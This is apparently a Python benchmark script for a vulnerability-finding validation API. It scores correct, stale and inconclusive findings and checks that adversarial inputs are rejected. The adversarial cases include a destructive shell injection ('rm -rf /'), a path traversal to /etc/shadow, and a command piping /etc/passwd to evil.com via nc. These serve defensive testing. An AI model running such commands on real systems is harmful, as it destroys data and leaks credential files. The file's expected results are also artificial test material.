"""Evaluation script for Evidence Validation Engine.

Executes a comprehensive benchmark suite of real, false, inconclusive,
and adversarial test findings through the validation engine and produces
the Section 28 Evaluation Metrics summary directly from actual test runs.
"""

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from fastapi.testclient import TestClient
from api.server import app

client = TestClient(app)

BENCHMARK_CASES = [
    # Scenario A: Real vulnerabilities (Expected: CONFIRMED)
    {
        "id": "CASE-01",
        "description": "Vulnerable example-package == 1.2.3 on shop-api-01",
        "payload": {
            "finding_id": "F-001",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Outdated example-package"},
            "location": {"type": "package", "package": "example-package"},
            "evidence": {"claimed_version": "1.2.3"},
        },
        "expected_status": "CONFIRMED",
        "category": "CONFIRMED",
    },
    {
        "id": "CASE-02",
        "description": "Vulnerable log4j == 2.14.0 on shop-api-01",
        "payload": {
            "finding_id": "F-002",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Log4Shell CVE-2021-44228"},
            "location": {"type": "package", "package": "log4j"},
            "evidence": {"claimed_version": "2.14.0"},
        },
        "expected_status": "CONFIRMED",
        "category": "CONFIRMED",
    },
    {
        "id": "CASE-03",
        "description": "Exposed vulnerable flag file on shop-api-01",
        "payload": {
            "finding_id": "F-003",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Exposed sensitive token"},
            "location": {"type": "file", "path": "flag.txt"},
            "evidence": {"expected_exists": True},
        },
        "expected_status": "CONFIRMED",
        "category": "CONFIRMED",
    },
    {
        "id": "CASE-04",
        "description": "Exposed vulnerable configuration on shop-api-01",
        "payload": {
            "finding_id": "F-004",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "App config file exposed"},
            "location": {"type": "file", "path": "vulnerable_app.conf"},
            "evidence": {"expected_exists": True},
        },
        "expected_status": "CONFIRMED",
        "category": "CONFIRMED",
    },

    # Scenario B: Stale / Contradicted vulnerabilities on patched targets (Expected: NOT_CONFIRMED)
    {
        "id": "CASE-05",
        "description": "Stale claim of 1.2.3 on patched target (running 1.2.9)",
        "payload": {
            "finding_id": "F-005",
            "asset": {"id": "shop-api-01-patched"},
            "vulnerability": {"title": "Outdated example-package"},
            "location": {"type": "package", "package": "example-package"},
            "evidence": {"claimed_version": "1.2.3"},
        },
        "expected_status": "NOT_CONFIRMED",
        "category": "NOT_CONFIRMED",
    },
    {
        "id": "CASE-06",
        "description": "Stale claim of log4j 2.14.0 on patched target (running 2.17.1)",
        "payload": {
            "finding_id": "F-006",
            "asset": {"id": "shop-api-01-patched"},
            "vulnerability": {"title": "Log4Shell"},
            "location": {"type": "package", "package": "log4j"},
            "evidence": {"claimed_version": "2.14.0"},
        },
        "expected_status": "NOT_CONFIRMED",
        "category": "NOT_CONFIRMED",
    },
    {
        "id": "CASE-07",
        "description": "Claim of missing file existing on target",
        "payload": {
            "finding_id": "F-007",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Missing backdoor"},
            "location": {"type": "file", "path": "backdoor.php"},
            "evidence": {"expected_exists": True},
        },
        "expected_status": "NOT_CONFIRMED",
        "category": "NOT_CONFIRMED",
    },

    # Scenario C: Inconclusive cases (Expected: INCONCLUSIVE)
    {
        "id": "CASE-08",
        "description": "Unregistered asset ID (outside lab registry)",
        "payload": {
            "finding_id": "F-008",
            "asset": {"id": "unknown-corp-server"},
            "vulnerability": {"title": "Unregistered host check"},
            "location": {"type": "package", "package": "example-package"},
            "evidence": {"claimed_version": "1.2.3"},
        },
        "expected_status": "INCONCLUSIVE",
        "category": "INCONCLUSIVE",
    },
    {
        "id": "CASE-09",
        "description": "Unmapped location type (no registered probe)",
        "payload": {
            "finding_id": "F-009",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Kernel module claim"},
            "location": {"type": "kernel_driver"},
            "evidence": {"claimed_version": "5.4.0"},
        },
        "expected_status": "INCONCLUSIVE",
        "category": "INCONCLUSIVE",
    },
    {
        "id": "CASE-10",
        "description": "Another unmapped location type (firmware)",
        "payload": {
            "finding_id": "F-010",
            "asset": {"id": "db-cluster-01"},
            "vulnerability": {"title": "BIOS vulnerability"},
            "location": {"type": "firmware"},
            "evidence": {"claimed_version": "v1.2"},
        },
        "expected_status": "INCONCLUSIVE",
        "category": "INCONCLUSIVE",
    },
]

ADVERSARIAL_CASES = [
    {
        "id": "ADV-01",
        "description": "Shell injection metacharacter in package name",
        "payload": {
            "finding_id": "F-ADV-01",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "RCE exploit attempt"},
            "location": {"type": "package", "package": "requests; rm -rf /"},
            "evidence": {"claimed_version": "1.0"},
        },
        "expected_http_code": 400,
    },
    {
        "id": "ADV-02",
        "description": "Directory traversal attempting to escape lab root",
        "payload": {
            "finding_id": "F-ADV-02",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "LFI exploit attempt"},
            "location": {"type": "file", "path": "../../../../etc/shadow"},
            "evidence": {"expected_exists": True},
        },
        "expected_http_code": 400,
    },
    {
        "id": "ADV-03",
        "description": "Port scanning unauthorized port (22)",
        "payload": {
            "finding_id": "F-ADV-03",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Port scan"},
            "location": {"type": "port", "port": 22},
            "evidence": {"expected_state": "OPEN"},
        },
        "expected_http_code": 400,
    },
    {
        "id": "ADV-04",
        "description": "Smuggled 'command' field execution attempt",
        "payload": {
            "finding_id": "F-ADV-04",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Arbitrary command"},
            "location": {"type": "package", "package": "requests"},
            "evidence": {"claimed_version": "2.25.1"},
            "command": "cat /etc/passwd | nc evil.com 4444",
        },
        "expected_http_code": 400,
    },
    {
        "id": "ADV-05",
        "description": "Unregistered malicious probe override request",
        "payload": {
            "finding_id": "F-ADV-05",
            "asset": {"id": "shop-api-01"},
            "vulnerability": {"title": "Probe override"},
            "location": {"type": "package", "package": "requests"},
            "evidence": {"claimed_version": "2.25.1"},
            "probe": {"type": "EXEC_SHELLCODE"},
        },
        "expected_http_code": 400,
    },
    {
        "id": "ADV-06",
        "description": "Oversized payload rejection (>64KB)",
        "raw_content": '{"finding_id": "F-ADV-06", "asset": {"id": "shop-api-01"}, "pad": "' + ("X" * 70000) + '"}',
        "expected_http_code": 413,
    },
]


def run_evaluation():
    print("\n" + "=" * 60)
    print("RUNNING EVIDENCE VALIDATION ENGINE BENCHMARK")
    print("=" * 60 + "\n")

    total_cases = len(BENCHMARK_CASES)
    correct = 0
    false_confirmations = 0
    false_rejections = 0
    inconclusive = 0
    sandbox_failures = 0

    for case in BENCHMARK_CASES:
        resp = client.post("/validate", json=case["payload"])
        if resp.status_code != 200:
            print(f"[FAIL] {case['id']}: HTTP {resp.status_code} - {resp.text}")
            sandbox_failures += 1
            continue

        result = resp.json()
        status = result.get("status")

        if status == "INCONCLUSIVE":
            inconclusive += 1

        if status == case["expected_status"]:
            correct += 1
            print(f"[PASS] {case['id']}: {case['description']} -> {status} (conf: {result['confidence']})")
        else:
            if status == "CONFIRMED" and case["expected_status"] == "NOT_CONFIRMED":
                false_confirmations += 1
            elif status == "NOT_CONFIRMED" and case["expected_status"] == "CONFIRMED":
                false_rejections += 1
            print(f"[FAIL] {case['id']}: {case['description']} -> Got {status}, Expected {case['expected_status']}")

    accuracy = (correct / total_cases) * 100.0 if total_cases > 0 else 0.0

    print("\n" + "-" * 60)
    print("RUNNING ADVERSARIAL REJECTION BENCHMARK")
    print("-" * 60 + "\n")

    adv_total = len(ADVERSARIAL_CASES)
    adv_rejected = 0

    for adv in ADVERSARIAL_CASES:
        if "raw_content" in adv:
            resp = client.post("/validate", content=adv["raw_content"], headers={"Content-Type": "application/json"})
        else:
            resp = client.post("/validate", json=adv["payload"])

        if resp.status_code == adv["expected_http_code"]:
            adv_rejected += 1
            print(f"[PASS] {adv['id']}: {adv['description']} -> HTTP {resp.status_code} (Properly Rejected)")
        else:
            print(f"[FAIL] {adv['id']}: {adv['description']} -> Got HTTP {resp.status_code}, Expected {adv['expected_http_code']}")

    # Output formatting strictly adhering to Section 28
    print("\n" + "=" * 60)
    print("Validation Evaluation")
    print("---------------------")
    print(f"Cases: {total_cases}")
    print(f"Correct: {correct}")
    print(f"Accuracy: {accuracy:.1f}%")
    print(f"False confirmations: {false_confirmations}")
    print(f"False rejections: {false_rejections}")
    print(f"Inconclusive: {inconclusive}")
    print(f"Sandbox failures: {sandbox_failures}")
    print(f"Adversarial inputs correctly rejected: {adv_rejected}/{adv_total}")
    print("=" * 60 + "\n")


if __name__ == "__main__":
    run_evaluation()
